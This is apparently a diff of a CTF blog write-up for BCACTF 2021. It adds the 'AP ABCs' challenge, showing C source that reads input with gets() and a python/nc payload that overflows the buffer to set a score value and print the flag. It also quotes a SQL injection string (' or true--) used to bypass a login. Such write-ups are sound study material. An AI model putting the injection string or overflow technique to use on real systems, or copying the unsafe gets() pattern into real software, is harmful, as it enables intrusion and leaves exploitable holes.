@@ -414,6 +414,144 @@ The command to bypass the authentication scheme was `' or true--`.
 
 ![BCACTF 2021 Writeup](/assets/img/ctfImages/bcactf2021/img22.png)
 
-I changed my browser's user agent to "Agent Gerald" and then got the flag.
+I changed my browser's user agent to "Agent Gerald" and then got the flag when I entered the website.
 
 **Flag :** bcactf{y0u_h@ck3d_5tegos@urus_1nt3lligence}
+
+<br/>
+
+# AP ABCs (Binary Exploitation)
+
+![BCACTF 2021 Writeup](/assets/img/ctfImages/bcactf2021/img23.png)
+
+Source code for the challenge :
+
+```c
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+char *correct = "abcdefghijklmnopqrstuvwxyz";
+
+int main() {
+    int score = 1;
+    char response[50];
+
+    setbuf(stdout, NULL);
+    setbuf(stdin, NULL);
+    setbuf(stderr, NULL);
+
+    puts("Welcome to AP ABCs!");
+    puts("Unlike the non-AP class, you get the privilege of taking the AP test.");
+    puts("Wow, I know, so exciting right\?\?!1");
+    puts("Anyways, good luck!");
+    sleep(2);
+    puts("");
+    puts("╔══════════════════════════════════════════╗");
+    puts("║ 2021              AP® | 🌰 College Board ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║  ───────────────────────                 ║");
+    puts("║  AP Alphabet                             ║");
+    puts("║  Free-Response Questions                 ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║ Something about trademarks               ║");
+    puts("╚══════════════════════════════════════════╝");
+    sleep(2);
+    puts("");
+    puts("╔══════════════════════════════════════════╗");
+    puts("║          2021 AP® Alphabet FRQs          ║");
+    puts("║                                          ║");
+    puts("║                 ALPHABET                 ║");
+    puts("║                Section II                ║");
+    puts("║             Total Time—1 hour            ║");
+    puts("║           Number of Questions—1          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║ 1. Recite the alphabet                   ║");
+    puts("║                                          ║");
+    puts("║ ──────────────────────────────────────── ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                                          ║");
+    puts("║                   STOP                   ║");
+    puts("║                END OF EXAM               ║");
+    puts("║                                          ║");
+    puts("║                    -2-                   ║");
+    puts("╚══════════════════════════════════════════╝");
+    sleep(1);
+    puts("");
+    printf("Answer for 1: ");
+    gets(response);
+
+    for (int i = 0; i < 26; ++i) {
+        if (response[i] == 0)
+            break;
+        if (response[i] != correct[i])
+            break;
+
+        if (i == 0)
+            score = 1;
+        if (i == 7 || i == 14 || i == 20 || i == 24)
+            ++score;
+    }
+
+    puts("");
+    printf("You got a %d on your APs.\n", score);
+
+    if (score == 1)
+        puts("Ouch. That hurts.");
+    else if (score == 2)
+        puts("At least that's not a 1...");
+    else if (score == 3)
+        puts("You are \"qualified\".");
+    else if (score == 4)
+        puts("You are \"very well qualified\".");
+    else if (score == 5)
+        puts("Nice job!");
+    else if (score == 0x73434241) {
+        puts("Tsk tsk tsk.");
+        sleep(2);
+        puts("Cheating on the AP® tests is really bad!");
+        sleep(2);
+        puts("Let me read you the College Board policies:");
+        sleep(2);
+        
+        FILE *fp = fopen("flag.txt", "r");
+
+        if (fp == NULL) {
+            puts("AAAA, I lost my notes!");
+            puts("You stay here while I go look for them.");
+            puts("And don't move, you're still in trouble!");
+            puts("[If you are seeing this on the remote server, please contact admin].");
+            exit(1);
+        }
+
+        int c;
+        while ((c = getc(fp)) != EOF) {
+            putchar(c);
+            usleep(20000);
+        }
+
+        fclose(fp);
+    }
+}
+
+```
+
+I have to overflow the buffer to make the score equal 0x73434241 and if that happens, I get the flag. Once again, `gets()` allows me to overflow the buffer and after playing around with the `print_hex_memory()` function from the Angstrom 2021 CTF, I desgined my payload : `python2 -c 'print("\x00"*76+"\x41\x42\x43\x73")' | nc bin.bcactf.com 49154`.
+
+Injecting this into the server, we get the flag :
+
+**Flag :** bcactf{bca_is_taking_APs_in_june_aaaaaaaa_wish_past_me_luck}
